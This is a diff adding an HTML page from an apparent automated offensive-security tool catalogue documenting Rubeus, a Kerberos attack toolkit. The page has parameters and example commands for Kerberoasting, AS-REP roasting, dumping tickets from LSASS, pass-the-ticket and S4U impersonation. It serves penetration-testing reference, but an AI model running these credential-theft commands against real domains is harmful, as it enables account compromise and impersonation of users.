@@ -1,0 +1,120 @@
+<!DOCTYPE html><html lang="en"> <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="description" content="Kerberos abuse toolkit for Windows for performing AS-REP roasting, Kerberoasting, pass-the-ticket, S4U attacks, and Kerberos ticket manipulation."><link rel="alternate" type="text/markdown" href="/tools/security-ad-rubeus.md"><link rel="alternate" type="application/json" href="/api/v1/commands.json"><meta name="tool-namespace" content="security:ad:rubeus"><title>rubeus — AutoTest Knowledge Repository</title><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet"><link rel="stylesheet" href="/src/styles/global.css"><link rel="stylesheet" href="/_astro/_id_.CIRgCC12.css"><script type="module" src="/_astro/hoisted.DLmBDdUQ.js"></script></head> <body> <div class="wrapper"> <nav> <a href="/" class="nav-brand">AutoTest</a> <a href="/">Home</a> <a href="/tools">All Tools</a> <a href="/capabilities">Capabilities</a> <a href="/artifacts">Artifacts</a> <a href="/payloads">Payloads</a> <a href="/api/v1/commands.json">API (JSON)</a> <a href="/llms.txt">llms.txt</a> </nav>  <div class="two-col"> <div> <div class="meta-bar"> <span class="tag tag-domain">security</span> <span class="tag">enabled</span> <span class="tag tag-trust">verified</span> <span class="tag tag-risk-high">high</span> <span class="tag">v1.0.0</span> </div> <h1 style="font-size: 2.2rem; margin-bottom: 0.5rem;">rubeus</h1> <p style="font-size: 1.05rem; color: var(--text-secondary); margin-bottom: 1.5rem;"><em>Kerberos abuse toolkit for Windows for performing AS-REP roasting, Kerberoasting, pass-the-ticket, S4U attacks, and Kerberos ticket manipulation.</em></p> <div id="cosmos-bar" class="cosmos-bar" data-astro-cid-slm2pk6o> <button class="cosmos-toggle" onclick="toggleCosmos()" aria-label="Toggle cosmos config" data-astro-cid-slm2pk6o> <span class="cosmos-icon" data-astro-cid-slm2pk6o>&#9881;</span> <span class="cosmos-label" data-astro-cid-slm2pk6o>Cosmos</span> <span class="cosmos-badge" id="cosmos-badge" data-astro-cid-slm2pk6o>10.10.10.10:9001</span> <span class="cosmos-arrow" id="cosmos-arrow" data-astro-cid-slm2pk6o>&#9660;</span> </button> <div class="cosmos-panel" id="cosmos-panel" data-astro-cid-slm2pk6o> <div class="cosmos-fields" id="cosmos-fields" data-astro-cid-slm2pk6o> <!-- populated by cosmos.js --> </div> <div class="cosmos-actions" data-astro-cid-slm2pk6o> <button class="cosmos-btn" onclick="Cosmos.reset()" data-astro-cid-slm2pk6o>Reset to defaults</button> </div> </div> </div> <script>(function(){const defaultExpandedStr = "false";
+
+  const EXPANDED_KEY = "cosmos-expanded";
+  const defaultExpanded = defaultExpandedStr;
+
+  window.toggleCosmos = function () {
+    const bar = document.getElementById("cosmos-bar");
+    const panel = document.getElementById("cosmos-panel");
+    const arrow = document.getElementById("cosmos-arrow");
+    const isExpanded = bar.classList.toggle("expanded");
+    panel.style.display = isExpanded ? "block" : "none";
+    arrow.innerHTML = isExpanded ? "&#9660;" : "&#9660;";
+    try { localStorage.setItem(EXPANDED_KEY, isExpanded ? "1" : "0"); } catch (_) {}
+  };
+
+  (function initCosmosBar() {
+    const panel = document.getElementById("cosmos-panel");
+    const fields = document.getElementById("cosmos-fields");
+    const badge = document.getElementById("cosmos-badge");
+    const bar = document.getElementById("cosmos-bar");
+
+    try {
+      const saved = localStorage.getItem(EXPANDED_KEY);
+      if (saved === "1" || (saved === null && defaultExpanded === "true")) {
+        bar.classList.add("expanded");
+        if (panel) panel.style.display = "block";
+      }
+    } catch (_) {}
+
+    function render() {
+      if (!window.Cosmos) { setTimeout(render, 10); return; }
+      var config = window.Cosmos.getConfig();
+      if (!fields) return;
+      fields.innerHTML = config.map(function (c) {
+        var val = window.Cosmos.get(c.key);
+        var esc = function (s) { return String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;"); };
+        return '<div class="cosmos-field">' +
+          '<label for="cosmos-' + esc(c.key) + '">' + esc(c.label) + '</label>' +
+          '<input id="cosmos-' + esc(c.key) + '" type="' + (c.type === "number" ? "number" : "text") + '" ' +
+            'value="' + esc(val) + '" ' +
+            'placeholder="' + esc(c.placeholder || "") + '" ' +
+            'data-cosmos-key="' + esc(c.key) + '" ' +
+            'oninput="onCosmosInput(this)" />' +
+          '</div>';
+      }).join("");
+      updateBadge();
+    }
+
+    window.onCosmosInput = function (el) {
+      var key = el.getAttribute("data-cosmos-key");
+      if (window.Cosmos) window.Cosmos.set(key, el.value);
+    };
+
+    function updateBadge() {
+      if (!badge) return;
+      var ip = window.Cosmos ? window.Cosmos.get("ip") || "?" : "?";
+      var port = window.Cosmos ? window.Cosmos.get("port") || "?" : "?";
+      badge.textContent = ip + ":" + port;
+    }
+
+    if (window.Cosmos) {
+      window.Cosmos.onChange(function () { updateBadge(); });
+    }
+    render();
+  })();
+})();</script>  <div class="cmd-preview cosmos-preview" data-preview="{&#34;template&#34;:&#34;Rubeus.exe {command} {flags}&#34;,&#34;globalVars&#34;:{},&#34;paramNames&#34;:[&#34;command&#34;,&#34;flags&#34;]}" data-astro-cid-wofrsxkc> <div class="cmd-preview-header" data-astro-cid-wofrsxkc> <span class="cmd-preview-label" data-astro-cid-wofrsxkc>&#128203; Live Preview</span> <button class="cmd-preview-copy" onclick="copyPreviewCommand(this)" title="Copy command" data-astro-cid-wofrsxkc>&#128203; Copy</button> </div> <pre class="cmd-preview-output" id="cmd-preview-output" data-astro-cid-wofrsxkc><code data-astro-cid-wofrsxkc>Rubeus.exe {command} {flags}</code></pre> <div class="cmd-preview-params" id="cmd-preview-params" data-astro-cid-wofrsxkc> <span class="cmd-placeholder" data-ph="command" data-astro-cid-wofrsxkc> <code class="ph-tag ph-local" data-astro-cid-wofrsxkc> 📎 command </code> </span><span class="cmd-placeholder" data-ph="flags" data-astro-cid-wofrsxkc> <code class="ph-tag ph-local" data-astro-cid-wofrsxkc> 📎 flags </code> </span> </div> </div>   <div style="margin-bottom: 1.5rem;"> <pre><code>Rubeus.exe {command} {flags}</code></pre> <p style="font-size: 0.85rem; color: var(--text-muted); margin-top: 0.3rem;">
+Sandbox: execFile &middot; Timeout: 300s
+ </p> </div> </div> <aside class="sidebar-info"> <div class="cvss-widget" data-astro-cid-qmhzttxy> <div class="cvss-score" style="--score-color: #fb923c;" data-astro-cid-qmhzttxy> <span class="cvss-value" data-astro-cid-qmhzttxy>8.0</span> <span class="cvss-label" data-astro-cid-qmhzttxy>High</span> </div> <div class="cvss-bar-track" data-astro-cid-qmhzttxy> <div class="cvss-bar-fill" style="width: 79.5%; background: #fb923c;" data-astro-cid-qmhzttxy></div> </div> <div class="cvss-scale" data-astro-cid-qmhzttxy> <span data-astro-cid-qmhzttxy>0.0</span> <span style="color: var(--green);" data-astro-cid-qmhzttxy>Low</span> <span style="color: var(--amber);" data-astro-cid-qmhzttxy>Med</span> <span style="color: #fb923c;" data-astro-cid-qmhzttxy>High</span> <span style="color: var(--red);" data-astro-cid-qmhzttxy>10.0</span> </div>  </div>  <div style="font-weight:600;margin-bottom:0.75rem;font-size:0.9rem;color:var(--text-muted);text-transform:uppercase;letter-spacing:0.05em;">Info</div> <div class="info-row"><span class="info-label">ID</span><span class="info-value"><code>security-ad-rubeus</code></span></div> <div class="info-row"><span class="info-label">Namespace</span><span class="info-value" style="font-size:0.8rem;"><code>security:ad:rubeus</code></span></div> <div class="info-row"><span class="info-label">Version</span><span class="info-value">1.0.0</span></div> <div class="info-row"><span class="info-label">Risk</span><span class="info-value tag-risk-high">high</span></div> <div class="info-row"><span class="info-label">Trust</span><span class="info-value">verified</span></div> <div class="info-row"><span class="info-label">Policy</span><span class="info-value">enabled</span></div> <div class="info-row"><span class="info-label">Platforms</span><span class="info-value" style="font-size:0.8rem;">windows</span></div> <div class="info-row"><span class="info-label">Arch</span><span class="info-value" style="font-size:0.8rem;">amd64</span></div> <div class="info-row"><span class="info-label">Allowed Tools</span><span class="info-value" style="font-size:0.8rem;">rubeus, Bash, execFile</span></div> <div class="info-row" style="flex-direction:column;gap:0.25rem;padding:0.6rem 0;"> <span class="info-label">Integrity</span> <span class="info-value" style="font-size:0.65rem;font-family:var(--font-mono);word-break:break-all;line-height:1.4;">sha256:0331dc1d439857dcc06ce9565619bcdd5aea79ccebc81fb7d09848cab199add4</span> </div> <div class="info-row"><span class="info-label">Requires</span><span class="info-value" style="font-size:0.8rem;">TGS, TGT, Password</span></div> <div class="info-row"><span class="info-label">Services</span><span class="info-value" style="font-size:0.8rem;">Kerberos</span></div> <div class="info-row"><span class="info-label">Attack Types</span><span class="info-value" style="font-size:0.8rem;">CredentialAccess, Discovery</span></div> <div class="info-row"><span class="info-label">Techniques</span><span class="info-value" style="font-size:0.8rem;">credential-access, discovery</span></div>  </aside> </div> <div class="section"> <h2>Capabilities</h2> <div class="card-grid cols-2" style="margin-bottom:0;"> <div class="card" style="padding:0.75rem 1rem;animation:none;"> <code>security.ad.kerberos.bruteforce</code> </div><div class="card" style="padding:0.75rem 1rem;animation:none;"> <code>security.ad.kerberos.asreproast</code> </div><div class="card" style="padding:0.75rem 1rem;animation:none;"> <code>security.ad.kerberos.kerberoast</code> </div><div class="card" style="padding:0.75rem 1rem;animation:none;"> <code>security.ad.kerberos.passkey</code> </div><div class="card" style="padding:0.75rem 1rem;animation:none;"> <code>security.ad.kerberos.delegation</code> </div><div class="card" style="padding:0.75rem 1rem;animation:none;"> <code>security.credential.kerberostickets</code> </div> </div> </div><div class="section"> <h2>Parameters</h2> <div class="table-wrap"> <table> <thead> <tr> <th>Name</th> <th>Type</th> <th>Required</th> <th>Default</th> <th>Description</th> <th>Aliases</th> </tr> </thead> <tbody> <tr> <td><code>command</code></td> <td>string</td> <td>Yes</td> <td>-</td> <td>Rubeus command (kerberoast, asreproast, dump, etc.)</td> <td>-</td> </tr><tr> <td><code>flag-domain</code></td> <td>string</td> <td>No</td> <td>-</td> <td>Target domain</td> <td><code>/domain</code></td> </tr><tr> <td><code>flag-username</code></td> <td>string</td> <td>No</td> <td>-</td> <td>Username for authentication</td> <td><code>/username</code></td> </tr><tr> <td><code>flag-password</code></td> <td>string</td> <td>No</td> <td>-</td> <td>Password for authentication</td> <td><code>/password</code></td> </tr><tr> <td><code>flag-format</code></td> <td>string</td> <td>No</td> <td>-</td> <td>Output format (hashcat, john)</td> <td><code>/format</code></td> </tr><tr> <td><code>flag-outfile</code></td> <td>string</td> <td>No</td> <td>-</td> <td>Output file path</td> <td><code>/outfile</code></td> </tr><tr> <td><code>flag-ticket</code></td> <td>string</td> <td>No</td> <td>-</td> <td>Base64-encoded Kerberos ticket</td> <td><code>/ticket</code></td> </tr><tr> <td><code>flag-ptt</code></td> <td>boolean</td> <td>No</td> <td>-</td> <td>Pass-the-ticket</td> <td>-</td> </tr> </tbody> </table> </div> </div><div class="section"> <h2>Artifacts</h2> <div class="table-wrap"> <table> <thead> <tr><th>Type</th><th>Description</th><th>MIME</th><th>Schema</th><th>Trust</th></tr> </thead> <tbody> <tr><td><code>security.credential.hash.kerberos</code></td><td>Kerberos ticket hash data</td><td>text/plain</td><td>-</td><td>verified</td></tr><tr><td><code>credential.data</code></td><td>Extracted credential material</td><td>text/plain</td><td>-</td><td>verified</td></tr> </tbody> </table> </div> </div><div class="section"> <h2>Contract</h2> <div style="display:grid;grid-template-columns:1fr 1fr;gap:1rem;"> <div> <p style="font-size:0.85rem;color:var(--text-muted);margin-bottom:0.5rem;text-transform:uppercase;letter-spacing:0.05em;">Inputs</p> <div class="card" style="padding:0.65rem 0.85rem;margin-bottom:0.5rem;animation:none;"> <code>domain.name</code> <p style="font-size:0.8rem;color:var(--text-muted);margin-top:0.2rem;">Target domain FQDN</p> </div><div class="card" style="padding:0.65rem 0.85rem;margin-bottom:0.5rem;animation:none;"> <code>credential.username</code> <p style="font-size:0.8rem;color:var(--text-muted);margin-top:0.2rem;">Target username or user list file</p> </div><div class="card" style="padding:0.65rem 0.85rem;margin-bottom:0.5rem;animation:none;"> <code>credential.password</code> <p style="font-size:0.8rem;color:var(--text-muted);margin-top:0.2rem;">Password or NTLM hash for authentication</p> </div> </div> <div> <p style="font-size:0.85rem;color:var(--text-muted);margin-bottom:0.5rem;text-transform:uppercase;letter-spacing:0.05em;">Outputs</p> <div class="card" style="padding:0.65rem 0.85rem;margin-bottom:0.5rem;animation:none;"> <code>security.credential.hash.kerberos</code> <p style="font-size:0.8rem;color:var(--text-muted);margin-top:0.2rem;">Crackable Kerberos hashes</p> </div><div class="card" style="padding:0.65rem 0.85rem;margin-bottom:0.5rem;animation:none;"> <code>credential.data</code> <p style="font-size:0.8rem;color:var(--text-muted);margin-top:0.2rem;">Extracted Kerberos tickets and credentials</p> </div> </div> </div> <div class="card" style="margin-top:0.75rem;animation:none;"> <span style="font-size:0.85rem;color:var(--text-muted);">Side effects: </span> <code style="font-size:0.8rem;">network_trafficfilesystem_write</code> </div> </div><div class="section"> <h2>Workflow Edges</h2> <div style="display:grid;grid-template-columns:1fr 1fr;gap:1rem;"> <div> <p style="font-size:0.85rem;color:var(--text-muted);margin-bottom:0.5rem;text-transform:uppercase;letter-spacing:0.05em;">Produces</p> <span class="tag" style="margin:0.15rem;">security.credential.hash.kerberos</span><span class="tag" style="margin:0.15rem;">credential.data</span> </div> <div> <p style="font-size:0.85rem;color:var(--text-muted);margin-bottom:0.5rem;text-transform:uppercase;letter-spacing:0.05em;">Consumes</p> <span class="tag" style="margin:0.15rem;">domain.name</span><span class="tag" style="margin:0.15rem;">credential.username</span><span class="tag" style="margin:0.15rem;">credential.password</span> </div> </div> </div><div class="section"> <h2>Resource Profile</h2> <div class="table-wrap" style="max-width:400px;"> <table> <thead><tr><th>Resource</th><th>Value</th></tr></thead> <tbody> <tr><td>CPU</td><td>low</td></tr> <tr><td>Memory</td><td>128 MB</td></tr> <tr><td>Network</td><td>low</td></tr> <tr><td>Disk I/O</td><td>low</td></tr> </tbody> </table> </div> </div><div class="section"> <h2>Examples</h2> <div class="example"> <p><strong>Kerberoasting SPNs</strong></p> <pre><code>Rubeus.exe kerberoast /domain:example.com /outfile:hashes.txt</code></pre> </div><div class="example"> <p><strong>AS-REP roasting users without pre-authentication</strong></p> <pre><code>Rubeus.exe asreproast /domain:example.com /format:hashcat /outfile:asrep.txt</code></pre> </div><div class="example"> <p><strong>Dump Kerberos tickets from current session</strong></p> <pre><code>Rubeus.exe dump /service:krbtgt</code></pre> </div><div class="example"> <p><strong>Pass-the-ticket</strong></p> <pre><code>Rubeus.exe asktgt /user:admin /domain:example.com /ticket:&lt;BASE64&gt;</code></pre> </div><div class="example"> <p><strong>S4U2Self attack</strong></p> <pre><code>Rubeus.exe s4u /user:svc_account /impersonateuser:admin /domain:example.com</code></pre> </div> </div><div class="section"> <h2>Documentation</h2> <div class="body-content"><h1>Rubeus — Kerberos Abuse Toolkit</h1>
+<p>Rubeus is a C# toolset for raw Kerberos interaction and abuse, designed for offensive security operations. It provides capabilities for Kerberoasting, AS-REP roasting, pass-the-ticket, pass-the-key, S4U attacks, and ticket manipulation.</p>
+<h2>Common Attacks</h2>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Attack</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>kerberoast</code></td>
+<td>Extract SPN service account hashes</td>
+</tr>
+<tr>
+<td><code>asreproast</code></td>
+<td>Find users without pre-authentication</td>
+</tr>
+<tr>
+<td><code>dump</code></td>
+<td>Extract tickets from LSASS</td>
+</tr>
+<tr>
+<td><code>asktgt</code></td>
+<td>Request TGT with specific options</td>
+</tr>
+<tr>
+<td><code>s4u</code></td>
+<td>S4U2Self/S4U2Proxy delegation attacks</td>
+</tr>
+<tr>
+<td><code>renew</code></td>
+<td>Renew existing tickets</td>
+</tr>
+<tr>
+<td><code>describe</code></td>
+<td>Decode and inspect ticket contents</td>
+</tr>
+</tbody></table>
+<h2>Usage</h2>
+<pre><code class="language-batch">:: Kerberoasting
+Rubeus.exe kerberoast /domain:example.local /outfile:kerb-hashes.txt
+
+:: AS-REP roasting
+Rubeus.exe asreproast /format:hashcat /outfile:asrep-hashes.txt
+
+:: Dump tickets
+Rubeus.exe dump /luid:0x123456
+
+:: Pass the ticket (ask TGT)
+Rubeus.exe asktgt /user:admin /domain:example.local /aes256:&lt;AES256_HASH&gt; /ptt
+</code></pre>
+</div> </div><div class="section"> <h2>Related Tools</h2> <span class="tag" style="margin:0.15rem;">impacket</span><span class="tag" style="margin:0.15rem;">mimikatz</span><span class="tag" style="margin:0.15rem;">certipy</span><span class="tag" style="margin:0.15rem;">kerbrute</span> </div><div class="section"> <h2>References</h2> <ul> <li><a href="https://github.com/GhostPack/Rubeus" target="_blank">Rubeus GitHub</a></li><li><a href="https://posts.specterops.io/kerberos-attacks-part-1-kerberoasting-60b1edc051c4" target="_blank">Kerberos Attacks Explained</a></li> </ul> </div> <footer> <p>AutoTest Knowledge Repository — Dual-Purpose Human / Machine Reference</p> <p>90 tools · 7 domains · 274 capabilities · 87 workflow edges · 135 payloads</p> </footer> </div>  </body> </html>
